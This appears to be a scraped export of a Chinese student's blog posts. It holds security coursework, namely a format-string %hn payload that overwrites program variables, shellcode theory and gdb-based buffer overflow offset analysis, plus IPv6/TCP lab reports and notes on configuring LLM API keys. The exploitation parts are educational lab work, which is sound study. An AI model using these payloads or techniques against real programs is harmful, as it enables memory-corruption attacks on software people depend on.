read2file2.c azureuser@MyServer:~/hw$ gcc -m32 -o read2file2 read2file2.c\n0xCDEF - 5*9 - 12 = 52662 0x5678 - 0xCDEF = -30583\n当尝试计算0x5678 - 0xCDEF时得到了负数，这是因为0x5678小于0xCDEF。为了解决这个问题，可以利用无符号整数的环绕性质。\n将负数-30583视为一个大的正数。具体来说，将-30583添加到2^16（即65536，因为%hn写入的是16位值）来得到一个正数：\n65536−30583=34953\n使用34953作为%hn的值来代替-30583。\n得到字符串： %08x.%08x.%08x.%08x.%08x.%.52662u%hn%.34953u%hn.%08x.%08x.\n命令行输入到文件mystring中\n1azureuser@MyServer:~/hw$ ./read2file2 2Please enter an address. 34294954548 4Please enter the format string: 5%08x.%08x.%08x.%08x.%08x.%.52662u%hn%.34953u%hn.%08x.%08x. 6The string length is 70 将文件mystring作为输入重定向到漏洞程序，并将输出定向到 文件result.txt中：\n1azureuser@MyServer:~/hw$ ./v2 \u0026lt; mystring \u0026gt; result.txt 2azureuser@MyServer:~/hw$ tail -n 1 result.txt 3New values A=0x3435 B=0x5678cdef C=0x7879. ","date":"2023-12-18T11:28:18+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A8/","title":"网络安全作业8"},{"content":"第九章 简述shellcode 的概念以及编写shellcode的步骤。\nshellcode是注入到目标进程中的二进制代码，其功能取决于编写者的意图。 编写shellcode要经过以下3个步骤： 编写简洁的能完成所需功能的C程序； 反汇编可执行代码，用系统功能调用代替函数调用，用汇编语言实现相同的功能； 提取出操作码，写成shellcode，并用C程序验证。 Linux环境下的shellcode为什么不调用libc中的库函数，而是利用系统调用？\n通过系统调用可以直接访问系统内核，具有非常强大的功能。 Shellcode 通常需要尽可能小，以便能够有效地注入到受限的内存空间或数据流中。直接使用系统调用比调用 libc 函数占用更少的空间，因为这避免了链接和加载整个库的开销。 在安全测试和渗透测试中，shellcode 需要尽可能隐蔽地执行。直接使用系统调用可能帮助绕过一些安全监测工具和防御机制，因为它们更多地关注对常见库函数的调用。 直接使用系统调用可以使shellcode更加独立和可移植。因为libc的版本和实现在不同的系统和环境中可能会有所不同，依赖于特定版本的libc函数可能会导致shellcode在某些环境下无法正常工作。 在攻击字符串中4字节的RET除了其取在攻击字符串中4字节的RET除了其取值范围要猜测准确外，还有什么需要考虑的（或者说有什么限制）？\n地址空间布局随机化，现代操作系统采用了地址随机化技术，缓冲区的起始地址是会动态变化的，必须在攻击串中放置足够多的NOP，以使得RET的取值范围足够大，才能猜测一个正确的RET。 RET指令的返回地址是函数返回时要跳转到的地址。如果返回地址指向了程序的不可执行代码区域，则攻击也将失败。 一些程序可能会使用栈保护来防止溢出攻击。例如，程序可能会设置栈的大小限制，或者使用栈保护指令来检查栈是否溢出。 RET指令的地址必须具有可写权限。如果RET指令的地址具有只读权限，则程序将无法修改该地址。 如果RET地址包含零字节，那么在某些情况下，程序可能会提前终止字符串的处理，这可能会阻止攻击的进行。 第十章 简述进程跳转攻击方法的基本思想\n从系统必须加载的动态链接库(如ntdll.dll，kernel32.dll)中寻找call esp和jmp esp指令，记录下该地址（溢出攻击的跳转地址），将该地址覆盖函数的返回地址，而将shellcode放在返回地址所在单元的后面。 这样就确保溢出后通过动态链接库中的指令而跳转到被注入到进程堆栈中的shellcode。 ","date":"2023-12-13T21:46:25+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A6/","title":"网络安全作业6"},{"content":"得分：10/10\nC程序homework08.c的主函数如下：\n1int main(int argc, char * argv[]) { 2init_buf(Lbuffer, LEN); 3switch(argc) 4{ 5case 1: f00(); break; 6case 2: f01(); break; 7case 3: f02(); break; 8default: f00(); break; 9} 10puts(\u0026#34;Done.\\nThe program exited normally.\u0026#34;); 11return 0; 12} 在32位的ubuntu16.04系统中用gcc -fno-stack-protector 编译该程序，得到的可执行程序见附件，通过gdb调试，对f00()、f01()和f02()进行分析： (1) 函数f00()、f01()和f02()是否导致段错误。 如果没有命令行参数（argc 等于 1，因为程序名本身也算一个参数），则执行函数 f00()。 如果有一个命令行参数（argc 等于 2），则执行函数 f01()。 如果有两个命令行参数（argc 等于 3），则执行函数 f02()。 如果有三个或更多的命令行参数，还是执行函数 f00()。 ![[Pasted image 20231122231415.png]] 函数foo(), 和 foo01() 都会导致段错误。\n如果函数f00()、f01()和f02()导致段错误，计算出被攻击的缓冲区首地址与函数的返回地址所在的栈地址的距离（即偏移OFFSET)，给出溢出后函数的返回地址(用16进制数表示)。 f00() ![[Pasted image 20231121150016.png]]\n打断点 函数入口处的堆栈指针esp指向的栈（地址为0xffffd1dc）保存了 函数f00()返回到调用函数(main)的地址（0x080485a8），即“函数的返回地址”\n记录堆栈指针esp的值，在此以A标记：A=$esp = 0xffffd1dc\n1(gdb) x/x $esp 20xffffd1dc: 0x080485a8 3(gdb) c 4Continuing. 5 6Breakpoint 2, 0x080484e9 in f00 () 71: x/i $eip 8=\u0026gt; 0x80484e9 \u0026lt;f00+24\u0026gt;: call 0x8048320 \u0026lt;strcpy@plt\u0026gt; 9(gdb) x/x $esp 100xffffd140: 0xffffd155 11(gdb) 120xffffd144: 0x0804a060 13(gdb) x/x 0x0804a060 140x804a060 \u0026lt;Lbuffer\u0026gt;: 0x44434241 令B = 0xffffd155，则offset=A-B=0xffffd1dc - 0xffffd155 =0x87=135。\n1(gdb) c 2Continuing. 3 4Breakpoint 3, 0x080484f3 in f00 () 51: x/i $eip 6=\u0026gt; 0x80484f3 \u0026lt;f00+34\u0026gt;: ret 7(gdb) x/x $esp 80xffffd1dc: 0x49484746 9(gdb) x/s $esp 100xffffd1dc: \u0026#34;FGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVW\u0026#34;... 执行ret之前的堆栈的内容可以推断执行ret后将跳到地址0x49484746去执行\nf01 执行程序\n1azureuser@MyServer:~/hw$ gdb homework08 main\n1(gdb) disas main 2Dump of assembler code for function main: 3 0x0804856c \u0026lt;+0\u0026gt;: lea 0x4(%esp),%ecx 4 0x08048570 \u0026lt;+4\u0026gt;: and $0xfffffff0,%esp 5 0x08048573 \u0026lt;+7\u0026gt;: pushl -0x4(%ecx) 6 0x08048576 \u0026lt;+10\u0026gt;: push %ebp 7 0x08048577 \u0026lt;+11\u0026gt;: mov %esp,%ebp 8 0x08048579 \u0026lt;+13\u0026gt;: push %ebx 9 0x0804857a \u0026lt;+14\u0026gt;: push %ecx 10 0x0804857b \u0026lt;+15\u0026gt;: mov %ecx,%ebx 11 0x0804857d \u0026lt;+17\u0026gt;: sub $0x8,%esp 12 0x08048580 \u0026lt;+20\u0026gt;: push $0x400 13 0x08048585 \u0026lt;+25\u0026gt;: push $0x804a060 14 0x0804858a \u0026lt;+30\u0026gt;: call 0x804846b \u0026lt;init_buf\u0026gt; 15 0x0804858f \u0026lt;+35\u0026gt;: add $0x10,%esp 16 0x08048592 \u0026lt;+38\u0026gt;: mov (%ebx),%eax 17 0x08048594 \u0026lt;+40\u0026gt;: cmp $0x2,%eax 18 0x08048597 \u0026lt;+43\u0026gt;: je 0x80485aa \u0026lt;main+62\u0026gt; 19 0x08048599 \u0026lt;+45\u0026gt;: cmp $0x3,%eax 20 0x0804859c \u0026lt;+48\u0026gt;: je 0x80485b1 \u0026lt;main+69\u0026gt; 21 0x0804859e \u0026lt;+50\u0026gt;: cmp $0x1,%eax 22 0x080485a1 \u0026lt;+53\u0026gt;: jne 0x80485b8 \u0026lt;main+76\u0026gt; 23 0x080485a3 \u0026lt;+55\u0026gt;: call 0x80484d1 \u0026lt;f00\u0026gt; 24 0x080485a8 \u0026lt;+60\u0026gt;: jmp 0x80485be \u0026lt;main+82\u0026gt; 25 0x080485aa \u0026lt;+62\u0026gt;: call 0x80484f4 \u0026lt;f01\u0026gt; 26 0x080485af \u0026lt;+67\u0026gt;: jmp 0x80485be \u0026lt;main+82\u0026gt; 27 0x080485b1 \u0026lt;+69\u0026gt;: call 0x8048530 \u0026lt;f02\u0026gt; 28 0x080485b6 \u0026lt;+74\u0026gt;: jmp 0x80485be \u0026lt;main+82\u0026gt; 29 0x080485b8 \u0026lt;+76\u0026gt;: call 0x80484d1 \u0026lt;f00\u0026gt; 30 0x080485bd \u0026lt;+81\u0026gt;: nop 31 0x080485be \u0026lt;+82\u0026gt;: sub $0xc,%esp 32 0x080485c1 \u0026lt;+85\u0026gt;: push $0x8048660 33 0x080485c6 \u0026lt;+90\u0026gt;: call 0x8048330 \u0026lt;puts@plt\u0026gt; 34 0x080485cb \u0026lt;+95\u0026gt;: add $0x10,%esp 35 0x080485ce \u0026lt;+98\u0026gt;: mov $0x0,%eax 36 0x080485d3 \u0026lt;+103\u0026gt;: lea -0x8(%ebp),%esp 37 0x080485d6 \u0026lt;+106\u0026gt;: pop %ecx 38 0x080485d7 \u0026lt;+107\u0026gt;: pop %ebx 39 0x080485d8 \u0026lt;+108\u0026gt;: pop %ebp 40 0x080485d9 \u0026lt;+109\u0026gt;: lea -0x4(%ecx),%esp 41 0x080485dc \u0026lt;+112\u0026gt;: ret 42End of assembler dump. f01()\n1(gdb) disas f01 2Dump of assembler code for function f01: 3 0x080484f4 \u0026lt;+0\u0026gt;: push %ebp 4 0x080484f5 \u0026lt;+1\u0026gt;: mov %esp,%ebp 5 0x080484f7 \u0026lt;+3\u0026gt;: sub $0x508,%esp 6 0x080484fd \u0026lt;+9\u0026gt;: sub $0x8,%esp 7 0x08048500 \u0026lt;+12\u0026gt;: push $0x400 8 0x08048505 \u0026lt;+17\u0026gt;: lea -0x4fe(%ebp),%eax 9 0x0804850b \u0026lt;+23\u0026gt;: push %eax 10 0x0804850c \u0026lt;+24\u0026gt;: call 0x804846b \u0026lt;init_buf\u0026gt; 11 0x08048511 \u0026lt;+29\u0026gt;: add $0x10,%esp 12 0x08048514 \u0026lt;+32\u0026gt;: sub $0x8,%esp 13 0x08048517 \u0026lt;+35\u0026gt;: lea -0x4fe(%ebp),%eax 14 0x0804851d \u0026lt;+41\u0026gt;: push %eax 15 0x0804851e \u0026lt;+42\u0026gt;: lea -0xfe(%ebp),%eax 16 0x08048524 \u0026lt;+48\u0026gt;: push %eax 17 0x08048525 \u0026lt;+49\u0026gt;: call 0x8048320 \u0026lt;strcpy@plt\u0026gt; 18 0x0804852a \u0026lt;+54\u0026gt;: add $0x10,%esp 19 0x0804852d \u0026lt;+57\u0026gt;: nop 20 0x0804852e \u0026lt;+58\u0026gt;: leave 21 0x0804852f \u0026lt;+59\u0026gt;: ret 22End of assembler dump. 设置断点\n1(gdb) b*(f01+0) 2Breakpoint 1 at 0x80484f4 3(gdb) b*(f01+49) 4Breakpoint 2 at 0x8048525 5(gdb) b*(f01+59) 6Breakpoint 3 at 0x804852f 1(gdb) display/i $eip 21: x/i $eip 3\u0026lt;error: No registers.\u0026gt; 4(gdb) x/i $eip 5No registers. 6(gdb) run 1 7Starting program: /home/azureuser/hw/homework08 1 8 9Breakpoint 1, 0x080484f4 in f01 () 101: x/i $eip 11=\u0026gt; 0x80484f4 \u0026lt;f01\u0026gt;: push %ebp 12(gdb) x/x $esp 130xffffd1cc: 0x080485af 记录堆栈指针esp的值，在此以A标记：A=$esp = 0xffffd1cc\n继续执行到下一个断点\n1(gdb) c 2Continuing. 3 4Breakpoint 2, 0x08048525 in f01 () 51: x/i $eip 6=\u0026gt; 0x8048525 \u0026lt;f01+49\u0026gt;: call 0x8048320 \u0026lt;strcpy@plt\u0026gt; 7(gdb) x $esp 80xffffccb0: 0xffffd0ca 9(gdb) 100xffffccb4: 0xffffccca 11(gdb) x/x 0xffffccca 120xffffccca: 0x44434241 B=0xffffd0ca。\noffset=A-B= 0xffffd1cc - 0xffffd0ca =0x102=258。\n1(gdb) c 2Continuing. 3 4Breakpoint 3, 0x0804852f in f01 () 51: x/i $eip 6=\u0026gt; 0x804852f \u0026lt;f01+59\u0026gt;: ret 7(gdb) x/x $esp 80xffffd1cc: 0x42415a59 9(gdb) x/s $esp 100xffffd1cc: \u0026#34;YZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOP\u0026#34;... 11(gdb) si 120x42415a59 in ?? () 131: x/i $eip 14=\u0026gt; 0x42415a59: \u0026lt;error: Cannot access memory at address 0x42415a59\u0026gt; 15(gdb) x/s $esp 160xffffd1d0: \u0026#34;CDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRST\u0026#34;... 返回地址变 为 0x42415a59\n其他（本次实验的一些其它尝试） 由于这个可执行文件是ubuntu16.04编译的，本身我的虚拟机系统是ubuntu18.04，一开始执行文件老是报错： 1~$ ./homework08 2-bash: ./homework08: No such file or directory 查询之后发现不是文件不存在，是缺少需要的依赖，因为Ubuntu18.04默认去掉了32bit的library。\n解决方法\n1sudo apt-get install lib32z1 之后就可以执行了。\n本身自己的电脑是mac m2芯片，一开始没尝试使用虚拟机而是docker在容器内去pull ubuntu的镜像来尝试实验：% docker run --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -it --platform linux/386 -v \u0026quot;/Users/agq/Downloads/srcToStudent:/srcToStudent\u0026quot; --name=hw6 i386/ubuntu /bin/bash 发现能运行文件，并且可以显示段错误：\n但由于qemu天生不支持ptrace系统调用，而gdb正是依赖这个系统调用，所以无法进行调试（QEMU\u0026rsquo;s user-mode emulation does not support the ptrace system call）所以第二题就做不了，遂作罢。\n","date":"2023-11-24T15:55:04+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A5/","title":"网络安全作业5"},{"content":"基本操作 查看并记录 HostA 和 S 的 IPv6(ens5 scope:link) 地址 命令 ifconfig ens5。 命令解释 ifconfig是一个用于配置和显示Linux操作系统网络接口信息的命令。当执行ifconfig ens5命令时，它会显示ens5网络接口的配置信息，包括IP地址、子网掩码、MAC地址、数据包统计等。\nIPv6 连接： HostA 的终端 1 中执行 `sudo tcpdump -vxn host HostA 的 IPv6(ens5 scope:link) 地址 and S 的 IPv6(ens5 scope:link）地址 -i ens5`。 HostA 的终端 2 中执行 `ping6 -c 1 S 的 IPv6(ens5 scope:link）地址%ens5`。 命令解释 sudo tcpdump -vxn host HostA 的 IPv6(ens5 scope:link) 地址 and S 的 IPv6(ens5 scope:link）地址 -i ens5 这个命令的作用是使用tcpdump工具来捕获指定主机HostA和另一台主机S之间通过ens5网络接口的IPv6通信数据包。其中-v选项表示以详细模式显示数据包信息，-x选项表示以十六进制和ASCII形式显示数据包内容，-n选项表示以数字形式显示地址而不进行地址解析，-i ens5表示指定监听的网络接口为ens5。\nping6 -c 1 S 的 IPv6(ens5 scope:link）地址%ens5 这个命令的作用是向指定的IPv6地址发送一个ICMPv6 Echo Request数据包，以测试与目标主机S的连通性。其中-c 1表示只发送一个数据包，S 的 IPv6(ens5 scope:link）地址表示目标主机S的IPv6地址，%ens5表示指定使用ens5网络接口发送数据包。\n结果 【实验要求】：此步骤需要记录终端 1 中抓到的 2 个报文数据，表明哪个是请求报文，哪个是回复报文。根据 IPv6 协议报文格式分析上述 tcpdump 抓包结果，要求画出 IPv6 以及 ICMPv6 的基本报头结构并将各个字段分别填入其中 (例如 IP 协议版本、源地址和目的地址、源端口和目的端口、报文含义等)。对这个报文的含义加以解释。\n第一个报文是请求报文，第二个报文是回复报文。\n第一个报文的IPv6报头如下：\n1Version: 6 2Traffic Class: 0 3Flow Label: 0 4Payload Length: 64 5Next Header: ICMPv6 (58) 6Hop Limit: 64 7Source Address: fe80::f816:3eff:fea7:a942 8Destination Address: fe80::f816:3eff:fee7:f7b3 1+-------------+----------------+------------+------------------+ 2| Version | Traffic Class | Flow Label | Payload Length | 3+-------------+----------------+------------+------------------+ 4| 6 | 0 | 0 | 64 | 5+-------------+----------------+------------+------------------+ 6| Next Header | Hop Limit | Source Address | 7+-------------+----------------+-------------------------------+ 8| 58 | 64 | fe80::f816:3eff:fea7:a942 | 9+---------------+----------------+-----------------------------+ 10| Destination Address | 11+--------------------------------------------------------------+ 12| fe80::f816:3eff:fee7:f7b3 | 13+--------------------------------------------------------------+ ICMPv6报头如下：\n1Type: ICMPv6 Echo Request (128) 2Code: 0 3Checksum: 0x158e 4Identifier: 0x0001 5Sequence Number: 1 第二个报文的IPv6报头如下：\n1+-------------+----------------+------------+------------------+ 2| Version | Traffic Class | Flow Label | Payload Length | 3+-------------+----------------+------------+------------------+ 4| 6 | 0 | 0 | 64 | 5+-------------+----------------+------------+------------------+ 6| Next Header | Hop Limit | Source Address | 7+-------------+----------------+-------------------------------+ 8| 58 | 64 | fe80::f816:3eff:fee7:f7b3 | 9+---------------+----------------+-----------------------------+ 10| Destination Address | 11+--------------------------------------------------------------+ 12| e80::f816:3eff:fea7:a942 | 13+--------------------------------------------------------------+ ICMPv6报头如下：\n1Type: ICMPv6 Echo Reply (129) 2Code: 0 3Checksum: 0x0506 4Identifier: 0x0001 5Sequence Number: 1 根据ICMPv6报文的类型和代码，可以判断第一个报文是ICMPv6 Echo Request报文，第二个报文是ICMPv6 Echo Reply报文。\nICMPv6 Echo Request报文用于请求对端发送Echo Reply报文。第一个报文的源地址是fe80::f816:3eff:fea7:a942，目的地址是fe80::f816:3eff:fee7:f7b3。序列号为1，表示这是第一个请求报文。\nICMPv6 Echo Reply报文用于响应ICMPv6 Echo Request报文。第二个报文的源地址是fe80::f816:3eff:fee7:f7b3，目的地址是fe80::f816:3eff:fea7:a942。序列号为1，表示这是对第一个请求报文的响应 上述tcpdump抓包结果表明，两个主机之间正在进行ICMPv6 Echo测试。\n路由器公告报文 路由器公告报文的目的地址为 IPv6 组播地址中的“全节点地址”，它的地址是FF02::1，可用 tcpdump 侦听路由器公告报文。HostA 中另开一个终端 3 用于侦听路由器公告报文，命令为： sudo tcpdump –vxn host ff02::1 -i ens5\n【实验要求】记录 HostA 的终端 3 中 tcpdump 抓包得到的数据。由于路由器公告报文的发送有一定地周期，因此这里可能需要等待较长时间，可以把终端 3 最小化继续进行其他实验，等有结果后记录抓包得到的数据。如仍未顺利抓到此包，也可以参考附录中的图 4 回答下述问题。根据 tcpdump 抓取到的报文数据说明路由器通告报文通告了哪些信息并简单解释网络中的其它主机将会如何使用这些信息？\n命令解释 这个命令的作用是使用tcpdump工具来捕获发送到IPv6组播地址ff02::1的数据包，该地址是IPv6中的所有节点组播地址。其中-v选项表示以详细模式显示数据包信息，-x选项表示以十六进制和ASCII形式显示数据包内容，-n选项表示以数字形式显示地址而不进行地址解析，-i ens5表示指定监听的网络接口为ens5。\n结果 根据 tcpdump 抓取到的报文数据，路由器通告报文通告了以下信息：\n源地址：fe80::f816:3eff:fee6:e881 目标地址：ff02::1 路由前缀：2001:db8:85a3::/64 生命周期 网络中的其它主机将会使用这些信息来进行以下操作：\n获取路由信息：主机可以使用路由前缀信息来构建自己的路由表，从而能够将数据包发送到目的网络。 自动配置地址：如果路由器通告了 M 比特为 1，则主机将使用 DHCPv6 服务来获取 IPv6 地址。 启用 IPv6 邻居发现：主机可以使用路由器通告中的链路层选项来启用 IPv6 邻居发现。 地址解析 地址解析的目的是通过对端的 IP 获取对端的 MAC 地址。由于地址解析过程会在数据发送前自动进行，因此需要先用 tcpdump 侦听，再 ping 对端，即可观察到NS 和 NA 报文。\nHostA 的终端 1 执行命令 sudo tcpdump -vxn host HostA 的 IPv6(ens5 scope:link) 地址 -i ens5 HostA 的终端 2 执行命令 ping6 -c 1 HostB 的 IPv6(ens5 scope:link）地址%ens5。 命令解释 sudo tcpdump -vxn host HostA 的 IPv6(ens5 scope:link) 地址 -i ens5 这个命令的作用是使用tcpdump工具来捕获发送到特定IPv6地址（HostA的IPv6地址，ens5接口，scope为link）的数据包，其中-v选项表示以详细模式显示数据包信息，-x选项表示以十六进制和ASCII形式显示数据包内容，-n选项表示以数字形式显示地址而不进行地址解析，-i ens5表示指定监听的网络接口为ens5。\nping6 -c 1 HostB 的 IPv6(ens5 scope:link）地址%ens5。 这个命令的作用是向指定的IPv6地址（HostB的IPv6地址，ens5接口，scope为link）发送一个ICMPv6数据包，-c 1表示只发送一个数据包。在IPv6地址后面加上%ens5是为了指定数据包通过ens5接口发送。\n结果 【实验要求】：记录 HostA 的终端 1 中观察到邻居请求 (NS) 和邻居通告 (NA) 报文。根据抓取到的报文数据说明邻居请求及邻居公告报文通告了哪些信息，这些信息有什么作用？\n从抓取到的报文数据来看，邻居请求 (NS) 报文通告了以下信息：\n源地址：fe80::f816:3eff:fea7:a942 目标地址：fe80::f816:3eff:fee7:1aea 请求类型：Who has 这些信息用于查询目标地址的邻居节点。\n邻居通告 (NA) 报文通告了以下信息：\n源地址：fe80::f816:3eff:fee7:1aea 目标地址：fe80::f816:3eff:fea7:a942 链路层地址：fa:16:3e:5b:1a:ea 可达性：可达 这些信息用于告知源地址，目标地址是可达的，并且目标地址的链路层地址是 fa:16:3e:e7:f7:b3。 TCP 三次握手 netcat 可以在主机间建立 TCP 连接，建立连接时，可以用 tcpdump 对 报文抓包，观察到 TCP 的三次握手过程。\n首先在 S 的终端 1 中执行 nc -l 1958 侦听 1958 端口。\n之后在 HostA 的终端1 执行 sudo tcpdump -vxn host HostA 的 IPv4(ens5) 地址 andS 的 IPv4(ens5) 地址 -i ens5\n在HostA 的终端2 执行 nc S 的IPv4(ens5)地址 1958。\n命令解释 nc -l 1958：这个命令使用nc（netcat）工具在本地监听1958端口，等待接收数据。 sudo tcpdump -vxn host HostA 的 IPv4(ens5) 地址 andS 的 IPv4(ens5) 地址 -i ens5：这个命令是用来使用tcpdump工具来捕获网络数据包的命令。其中\u0026quot;-v\u0026quot;表示详细模式，\u0026quot;-x\u0026quot;表示以十六进制和ASCII格式显示数据包，\u0026quot;-n\u0026quot;表示以数字形式显示地址，\u0026quot;-i ens5\u0026quot;表示监听网络接口ens5上的数据包。\u0026ldquo;host HostA 的 IPv4(ens5) 地址 andS 的 IPv4(ens5) 地址\u0026quot;这部分应该是要指定要捕获的数据包的源和目标主机的IP地址。 nc S 的IPv4(ens5)地址 1958：这个命令使用nc（netcat）工具来连接到指定的IPv4地址的主机的1958端口。 结果 【实验要求】：完整记录 HostA 的终端 1 中观察到的前三个报文，即 TCP 握手报文。标注出每个报文的类型（SYN、SYN/ACK、ACK）。简要说明 TCP 协议采用三次握手的原因。说明实验中为何无法抓到 RST 包？请问编写应用程序时我们是否需要处理这些报文，为什么？\nTCP 协议采用三次握手的原因\n确保连接的建立是可靠的。 避免已建立的连接被重复建立。 避免连接被恶意攻击。 在三次握手的过程中，双方主机各发送一个 SYN 报文，然后再各发送一个 ACK 报文。这样，双方主机就可以确认对方是可靠的，并且连接是可靠的。\n实验中无法抓到 RST 包的原因\n在实验中，HostA 和 HostB 建立了 TCP 连接，并开始传输数据。如果 HostA 或 HostB 想要终止连接，则会发送 RST 包。但是，由于实验中我们没有终止连接，因此无法抓到 RST 包。\n如果 HostA 发送了一个无效的 TCP 报文，或者 HostB 拒绝建立连接，则 HostB 可能会发送 RST 包来终止连接。在这种情况下，可以通过 tcpdump 来抓到 RST 包。\n编写应用程序时是否需要处理这些报文\n编写应用程序时，通常不需要直接处理 TCP 握手报文。应用程序可以通过调用系统 API 来建立和管理 TCP 连接。\n隧道 注意 隧道删除命令为 ip tunnel del 隧道名称，若添加隧道命令打错可用此命令删除后重建。\n打开两个 Host 虚拟机并各打开一个终端 在 HostA 的终端上执行命令： sudo ip tunnel add sit1 mode sit remote HostB 的 IPv4 地址 local HostA 的 IPv4 地址 dev ens5（IPv4 地址可以由命令 ifconfig ens5 获得）\nsudo ip link set sit1 up\nip link show up【记录结果，此时可以看到名字为 sit1 的设备】 sudo ip addr add 3ffe:3216:2101:2106:1234::A/80 dev sit1\nip tunnel show【记录结果】 命令解释 sudo ip tunnel add sit1 mode sit remote HostB 的 IPv4 地址 local HostA 的 IPv4 地址 dev ens5：该命令用于创建一个名为 sit1 的隧道接口，该隧道接口的模式为 SIT，远程端地址为 HostB 的 IPv4 地址，本地端地址为 HostA 的 IPv4 地址，隧道接口绑定的物理接口为 ens5。\nsudo ip link set sit1 up：HostA 已经创建了名为 sit1 的隧道接口，但该隧道接口处于禁用状态。通过执行该命令，将 sit1 隧道接口置为启用状态。\nip link show 命令用于显示系统的网络接口信息，包括其当前状态。up 选项只显示当前已启用的网络接口。\nsudo ip addr add 3ffe:3216:2101:2106:1234::A/80 dev sit1 ：该命令用于将 IPv6 地址 3ffe:3216:2101:2106:1234::A 分配给隧道接口 sit1，前缀长度为 80\nip tunnel show 用于显示系统中所有隧道接口的信息。\n在 HostB 的终端上执行命令： sudo ip tunnel add sit1 mode sit remote HostA 的 IPv4 地址 local HostB 的 IPv4 地址 dev ens5（IPv4 地址可以由命令 ifconfig ens5 获得）\nsudo ip link set sit1 up\nip link show up【记录结果，此时可以看到名字为 sit1 的设备】 sudo ip addr add 3ffe:3216:2101:2106:1234::B/80 dev sit1\nip tunnel show【记录结果】 命令解释 sudo ip tunnel add sit1 mode sit remote HostA 的 IPv4 地址 local HostB 的 IPv4 地址 dev ens5 用于创建一个名为 sit1 的隧道接口。该隧道接口使用 SIT 模式，远程端地址为 HostA 的 IPv4 地址，本地端地址为 HostB 的 IPv4 地址。隧道接口绑定到物理接口 ens5。\nsudo ip link set sit1 up ：通过执行该命令，将 sit1 隧道接口置为启用状态。\nip link show 命令用于显示系统的网络接口信息，包括其当前状态。up 选项只显示当前已启用的网络接口。\nsudo ip addr add 3ffe:3216:2101:2106:1234::B/80 dev sit1 用于将 IPv6 地址 3ffe:3216:2101:2106:1234::B 分配给隧道接口 sit1，前缀长度为 80。\nip tunnel show 用于显示系统中所有隧道接口的信息。\n在 HostA 上打开两个终端。 其中一个终端用 tcpdump 侦听报文，另一个终端用于 ping6。\n首先在 HostA 的第 1 个终端中执行命令 sudo tcpdump -vxn -i sit1。\n其次在 HostA 的第 2 个终端中执行命令 ping6 –c 1 3ffe:3216:2101:2106 :1234::B，检查是否可以 ping 通，若不通则需要检查之前的步骤是否正确完成。 记录 HostA 的第 1 个终端中由 tcpdump 抓取的前两个报文。 关闭 HostA 的这两个终端并重新打开两个新的终端。\n在 HostA 的第 1 个终端中执行命令 sudo tcpdump -vxn –i ens5\n在 HostA 的第 2 个终端中执行命令 ping6 –c 1 3ffe:3216:2101:2106:1234::B。 记录 HostA 的第 1 个终端中由 tcpdump 抓取的前两个报文（可能要等一会儿）。 命令解释 sudo tcpdump -vxn -i sit1 用于捕获在隧道接口 sit1 上传输的网络数据包。\nping6 –c 1 3ffe:3216:2101:2106:1234::B该命令将向 IPv6 地址 3ffe:3216:2101:2106:1234::B 发送一个 ICMP 回显请求数据包。如果该地址可达，则目标主机将会响应一个 ICMP 回显应答数据包。\n结果解释 【实验要求】：记录需要记录的实验数据。从报文结构上看，通过隧道通信与两个 IPv6 主机直接通信的区别是什么，即上述隧道通信的报文有什么特点？\n通过隧道通信与两个 IPv6 主机直接通信的区别是什么：\n隧道通信的报文中，IPv6 头部包含了源地址和目标地址，以及隧道协议类型。两个 IPv6 主机直接通信的报文中，IPv6 头部只包含了源地址和目标地址。 隧道通信的报文中，包含了隧道协议头部，用于描述隧道连接的相关信息。两个 IPv6 主机直接通信的报文中，没有隧道协议头部。 ","date":"2023-11-20T10:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E5%AE%9E%E9%AA%8C2/","title":"信网实验2"},{"content":"项目地址 GitHub - binary-husky/gpt_academic: 为ChatGPT/GLM提供实用化交互界面，特别优化论文阅读/润色/写作体验，模块化设计，支持自定义快捷按钮\u0026amp;函数插件，支持Python和C++等项目剖析\u0026amp;自译解功能，PDF/LaTex论文翻译\u0026amp;总结功能，支持并行问询多种LLM模型，支持chatglm2等本地模型。兼容文心一言, moss, llama2, rwkv, claude2, 通义千问, 书生, 讯飞星火等。\napi配置 openai-api 因为已经有了gpt账户，所以直接在OpenAI Platform上生成一个key就可以了。注意这个key只能看一次。 azure-api 注册 因为注册azure本身需要信用卡，本来不想注册的，突然看到一个博客说azure学生认证之后可以不需要信用卡，试了一下果然可以。注册之后秒通过，科大邮箱还是靠谱的。 注册可以参考学生福利白嫖之路——申请Azure学生订阅 - 知乎\n配置 在搜索栏搜索Openai，然后创建 请求访问Azure OpenAI服务 然后填写问卷，第四个问题需要填写订阅ID， 参考： 获取 Azure 门户中的订阅和租户 ID - Azure portal | Microsoft Learn\n填完问卷之后要等一段时间的审核 星火api 登陆：讯飞开放平台 点击免费试用： 实名认证获得更多token 前往控制台-讯飞开放平台获取自己的key 输入到config.py中 注：需在这个列表添加 智谱清言 前往平台智谱AI开放平台登陆后前往 点击右上角查看apikey 复制key输入config.py的这个部分： 